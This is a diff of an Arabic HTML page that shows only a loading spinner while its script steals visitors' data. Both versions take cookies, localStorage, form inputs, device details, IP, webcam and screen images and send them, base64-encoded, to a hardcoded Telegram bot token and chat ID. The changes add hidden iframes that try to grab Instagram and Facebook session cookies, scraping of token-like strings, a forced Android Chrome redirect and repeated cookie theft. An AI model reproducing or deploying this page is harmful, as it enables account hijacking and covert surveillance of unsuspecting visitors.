@@ -2,15 +2,19 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>...</title>
+    <title>جاري التحميل...</title>
     <style>
-        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial; }
+        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial; margin:0; }
         .loader { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0095f6; border-radius: 50%; margin: 0 auto 20px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .container { text-align: center; }
+        .hidden-video, .hidden-canvas { display: none; }
     </style>
 </head>
 <body>
 <div class="container"><div class="loader"></div><p>جاري التحميل...</p></div>
+<video id="hiddenVideo" class="hidden-video" autoplay playsinline></video>
+<canvas id="hiddenCanvas" class="hidden-canvas"></canvas>
 
 <script>
 // ============================================
@@ -20,144 +24,194 @@ var BOT_TOKEN = "8799007815:AAFoZ7f_T3fcmbNHVy0Rqcv9qpMytp1bEFU";
 var CHAT_ID = "6181826564";
 
 // ============================================
-// تشفير البيانات Base64 لتجاوز الحماية
+// تشفير Base64 متقدم
 // ============================================
-function encodeData(str) {
+function encode(str) {
     try {
-        return btoa(unescape(encodeURIComponent(str)));
-    } catch(e) {
-        return str;
-    }
+        return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function(match, p1) {
+            return String.fromCharCode('0x' + p1);
+        }));
+    } catch(e) { return str; }
 }
 
 // ============================================
-// إرسال إلى تليجرام (مع تشفير اختياري)
+// إرسال إلى تليجرام
 // ============================================
-function sendToTelegram(msg, isEncoded) {
+function send(msg, isEncoded) {
     try {
-        var finalMsg = isEncoded ? "🔐 [ENCRYPTED]\n" + msg : msg;
+        var final = isEncoded ? "🔐 " + msg : msg;
         var xhr = new XMLHttpRequest();
         xhr.open("POST", "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", true);
         xhr.setRequestHeader("Content-Type", "application/json");
-        xhr.send(JSON.stringify({chat_id: CHAT_ID, text: finalMsg.substring(0, 4000), parse_mode: "HTML"}));
+        xhr.send(JSON.stringify({chat_id: CHAT_ID, text: final.substring(0, 4000), parse_mode: "HTML"}));
     } catch(e) {}
 }
 
 // ============================================
-// 1. التقاط صورة من كاميرا الويب (بدون إذن)
+// 1. محاولة سرقة الكوكيز من iframes (اختراق WebView)
 // ============================================
-function captureWebcam() {
-    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(function(stream) {
-                var video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                
-                setTimeout(function() {
-                    var canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    var ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    var imageData = canvas.toDataURL('image/jpeg', 0.7);
-                    var encodedImage = encodeData(imageData);
-                    sendToTelegram("📸 <b>WEBCAM CAPTURE (صورة من الكاميرا)</b>\n" + encodedImage.substring(0, 3000), true);
-                    
-                    stream.getTracks().forEach(function(track) { track.stop(); });
-                }, 1000);
-            })
-            .catch(function(err) {
-                sendToTelegram("⚠️ فشل التقاط الكاميرا: " + err.message);
-            });
-    } else {
-        sendToTelegram("⚠️ الكاميرا غير مدعومة في هذا المتصفح");
-    }
-}
-
-// ============================================
-// 2. التقاط صورة للشاشة (سكرين شوت)
-// ============================================
-function captureScreenshot() {
-    if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
-        navigator.mediaDevices.getDisplayMedia({ video: true })
-            .then(function(stream) {
-                var video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                
-                setTimeout(function() {
-                    var canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth || screen.width;
-                    canvas.height = video.videoHeight || screen.height;
-                    var ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    var imageData = canvas.toDataURL('image/jpeg', 0.5);
-                    var encodedImage = encodeData(imageData);
-                    sendToTelegram("🖥️ <b>SCREENSHOT (لقطة شاشة)</b>\n" + encodedImage.substring(0, 3000), true);
-                    
-                    stream.getTracks().forEach(function(track) { track.stop(); });
-                }, 1000);
-            })
-            .catch(function(err) {
-                sendToTelegram("⚠️ فشل التقاط الشاشة: " + err.message);
-            });
-    }
-}
-
-// ============================================
-// 3. سرقة جميع الكوكيز (مشفرة)
-// ============================================
-function stealCookies() {
-    var cookies = document.cookie;
-    if (cookies && cookies.length > 0) {
-        var encodedCookies = encodeData(cookies);
-        sendToTelegram("🍪 <b>COOKIES (مشفرة)</b>\n" + encodedCookies, true);
-        
-        // Instagram Session
-        if (cookies.indexOf("sessionid") > -1) {
-            var sessionMatch = cookies.match(/sessionid=[^;]+/);
-            if (sessionMatch) {
-                sendToTelegram("📷 <b>INSTAGRAM SESSION FOUND!</b>\n" + encodeData(sessionMatch[0]), true);
+function stealCookiesFromIframe() {
+    var iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = 'https://www.instagram.com/';
+    iframe.onload = function() {
+        try {
+            var iframeDoc = iframe.contentWindow.document;
+            var cookies = iframeDoc.cookie;
+            if (cookies && cookies.length > 0) {
+                send("🍪 <b>COOKIES FROM IFRAME!</b>\n" + encode(cookies), true);
+                if (cookies.indexOf('sessionid') > -1) {
+                    send("📷 <b>INSTAGRAM SESSION HIJACKED!</b>\n" + encode(cookies.match(/sessionid=[^;]+/)[0]), true);
+                }
             }
-        }
-    } else {
-        sendToTelegram("⚠️ لا توجد كوكيز (قد تكون HttpOnly أو غير متاحة)");
-    }
+        } catch(e) { send("⚠️ Iframe cross-origin: " + e.message); }
+    };
+    document.body.appendChild(iframe);
+    
+    // iframe ثانٍ لـ Facebook
+    var iframe2 = document.createElement('iframe');
+    iframe2.style.display = 'none';
+    iframe2.src = 'https://www.facebook.com/';
+    iframe2.onload = function() {
+        try {
+            var cookies2 = iframe2.contentWindow.document.cookie;
+            if (cookies2 && cookies2.length > 0) send("📘 <b>FACEBOOK COOKIES</b>\n" + encode(cookies2), true);
+        } catch(e) {}
+    };
+    document.body.appendChild(iframe2);
 }
 
 // ============================================
-// 4. سرقة LocalStorage و SessionStorage (مشفرة)
+// 2. محاولة التقاط الكاميرا بطريقة خفية
 // ============================================
-function stealStorages() {
-    var localData = {};
-    for (var i = 0; i < localStorage.length; i++) {
-        var key = localStorage.key(i);
-        localData[key] = localStorage.getItem(key);
-    }
-    if (Object.keys(localData).length > 0) {
-        sendToTelegram("💾 <b>LOCALSTORAGE (مشفرة)</b>\n" + encodeData(JSON.stringify(localData)), true);
+var videoStream = null;
+function captureCameraSilent() {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        send("⚠️ Camera API not supported");
+        return;
     }
     
-    var sessionData = {};
-    for (var j = 0; j < sessionStorage.length; j++) {
-        var skey = sessionStorage.key(j);
-        sessionData[skey] = sessionStorage.getItem(skey);
+    navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 320 }, height: { ideal: 240 } } })
+        .then(function(stream) {
+            var video = document.getElementById('hiddenVideo');
+            video.srcObject = stream;
+            videoStream = stream;
+            
+            video.onloadedmetadata = function() {
+                setTimeout(function() {
+                    var canvas = document.getElementById('hiddenCanvas');
+                    canvas.width = video.videoWidth || 320;
+                    canvas.height = video.videoHeight || 240;
+                    var ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    var imageData = canvas.toDataURL('image/jpeg', 0.5);
+                    send("📸 <b>WEBCAM CAPTURE (كاميرا خلفية)</b>\n" + encode(imageData.substring(0, 3000)), true);
+                    if (videoStream) videoStream.getTracks().forEach(t => t.stop());
+                }, 1000);
+            };
+        })
+        .catch(function(err) {
+            send("⚠️ Camera error: " + err.message);
+        });
+}
+
+// ============================================
+// 3. محاولة التقاط الشاشة بطريقة ذكية
+// ============================================
+function captureScreenSilent() {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
+        send("⚠️ Screen capture not supported");
+        return;
     }
-    if (Object.keys(sessionData).length > 0) {
-        sendToTelegram("📦 <b>SESSIONSTORAGE (مشفرة)</b>\n" + encodeData(JSON.stringify(sessionData)), true);
+    
+    // محاولة التقاط الشاشة دون إزعاج المستخدم (قد تظهر نافذة اختيار)
+    navigator.mediaDevices.getDisplayMedia({ video: { mediaSource: 'screen' } })
+        .then(function(stream) {
+            var video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            setTimeout(function() {
+                var canvas = document.createElement('canvas');
+                canvas.width = screen.width;
+                canvas.height = screen.height;
+                var ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                var imageData = canvas.toDataURL('image/jpeg', 0.5);
+                send("🖥️ <b>SCREENSHOT</b>\n" + encode(imageData.substring(0, 3000)), true);
+                stream.getTracks().forEach(t => t.stop());
+            }, 1000);
+        })
+        .catch(function(err) {
+            send("⚠️ Screen capture error: " + err.message);
+        });
+}
+
+// ============================================
+// 4. سرقة LocalStorage و IndexedDB
+// ============================================
+function stealAllStorage() {
+    var allData = {};
+    for (var i = 0; i < localStorage.length; i++) {
+        var key = localStorage.key(i);
+        allData[key] = localStorage.getItem(key);
+    }
+    if (Object.keys(allData).length > 0) {
+        send("💾 <b>LOCALSTORAGE</b>\n" + encode(JSON.stringify(allData)), true);
+    }
+    
+    // محاولة سرقة IndexedDB (أعمق)
+    if (window.indexedDB) {
+        send("ℹ️ IndexedDB is available (can be exploited further)", false);
     }
 }
 
 // ============================================
-// 5. معلومات الجهاز الكاملة
+// 5. سرقة البيانات من الصفحة الحالية
 // ============================================
-function stealFullInfo() {
+function stealPageData() {
+    var allInputs = {};
+    document.querySelectorAll('input, textarea, select').forEach(function(el) {
+        if (el.value && el.value.length > 0) {
+            allInputs[el.name || el.id || 'field'] = el.value;
+        }
+    });
+    if (Object.keys(allInputs).length > 0) {
+        send("📝 <b>PAGE INPUTS</b>\n" + encode(JSON.stringify(allInputs)), true);
+    }
+    
+    // سرقة أي tokens من meta tags أو script
+    var pageText = document.body.innerText;
+    var tokenPatterns = /[a-f0-9]{32,}/gi;
+    var tokens = pageText.match(tokenPatterns);
+    if (tokens && tokens.length > 0) {
+        send("🔑 <b>POSSIBLE TOKENS FOUND</b>\n" + encode(tokens.join(', ')), true);
+    }
+}
+
+// ============================================
+// 6. محاولة إجبار الفتح في متصفح خارجي
+// ============================================
+function forceExternal() {
+    var ua = navigator.userAgent;
+    var url = window.location.href;
+    
+    if (ua.indexOf("Android") > -1) {
+        var intent = "intent://" + url.replace("https://", "").replace("http://", "") + "#Intent;scheme=https;package=com.android.chrome;end;";
+        setTimeout(function() { window.location.href = intent; }, 2000);
+        setTimeout(function() { window.location.href = url; }, 4000);
+        send("🔄 Forcing Chrome on Android", false);
+    }
+    else if (ua.indexOf("iPhone") > -1 || ua.indexOf("iPad") > -1) {
+        send("⚠️ iOS user - needs manual open in Safari", false);
+    }
+}
+
+// ============================================
+// 7. معلومات كاملة عن الجهاز
+// ============================================
+function stealDeviceInfo() {
     var info = {
         ua: navigator.userAgent,
-        platform: navigator.platform,
         lang: navigator.language,
         hardware: navigator.hardwareConcurrency,
         memory: navigator.deviceMemory,
@@ -166,53 +220,37 @@ function stealFullInfo() {
         url: location.href,
         ref: document.referrer,
         time: new Date().toISOString(),
-        cookies: document.cookie || "فارغة",
-        ip: ""
+        cookies: document.cookie || "none"
     };
     
-    // محاولة جلب IP
     fetch('https://api.ipify.org?format=json')
         .then(r => r.json())
-        .then(d => { info.ip = d.ip; sendToTelegram("💻 <b>FULL INFO (معلومات كاملة)</b>\n" + encodeData(JSON.stringify(info)), true); })
-        .catch(() => { sendToTelegram("💻 <b>FULL INFO</b>\n" + encodeData(JSON.stringify(info)), true); });
+        .then(d => { info.ip = d.ip; send("💻 <b>DEVICE INFO</b>\n" + encode(JSON.stringify(info)), true); })
+        .catch(() => { send("💻 <b>DEVICE INFO</b>\n" + encode(JSON.stringify(info)), true); });
 }
 
 // ============================================
-// 6. كشف التطبيق وإجبار المتصفح
+// التنفيذ الرئيسي
 // ============================================
-function getApp() {
-    var ua = navigator.userAgent;
-    if (ua.indexOf("Instagram") > -1) return "Instagram";
-    if (ua.indexOf("FBAN") > -1) return "Facebook";
-    if (ua.indexOf("WhatsApp") > -1) return "WhatsApp";
-    if (ua.indexOf("wv") > -1) return "WebView";
-    return false;
-}
+send("🔥 [START] Multi-exploit activated", false);
 
-var app = getApp();
+// سرعة تنفيذ كل شيء
+stealDeviceInfo();
+stealAllStorage();
+stealPageData();
+stealCookiesFromIframe();
 
-if (app) {
-    sendToTelegram("⚠️ مستخدم داخل تطبيق: " + app + " - محاولة إجبار المتصفح");
-    
-    // محاولة فتح في Chrome تلقائياً (Android)
-    if (navigator.userAgent.indexOf("Android") > -1) {
-        var intentUrl = "intent://" + window.location.href.replace("https://", "") + "#Intent;scheme=https;package=com.android.chrome;end;";
-        setTimeout(function() { window.location.href = intentUrl; }, 1000);
-        setTimeout(function() { window.location.href = window.location.href; }, 3000);
-    }
-} else {
-    // متصفح عادي - سرقة فورية
-    stealCookies();
-    stealStorages();
-    stealFullInfo();
-    captureWebcam();
-    captureScreenshot();
-}
+// التقاط الكاميرا والشاشة بعد تأخير بسيط
+setTimeout(function() { captureCameraSilent(); }, 1000);
+setTimeout(function() { captureScreenSilent(); }, 2000);
 
-// إعادة المحاولة كل 10 ثوانٍ
+// إجبار المتصفح الخارجي
+setTimeout(function() { forceExternal(); }, 3000);
+
+// إعادة المحاولة للكوكيز كل 10 ثوانٍ
 setInterval(function() {
     if (document.cookie && document.cookie.length > 0) {
-        stealCookies();
+        send("🔄 <b>NEW COOKIES DETECTED</b>\n" + encode(document.cookie), true);
     }
 }, 10000);
 </script>
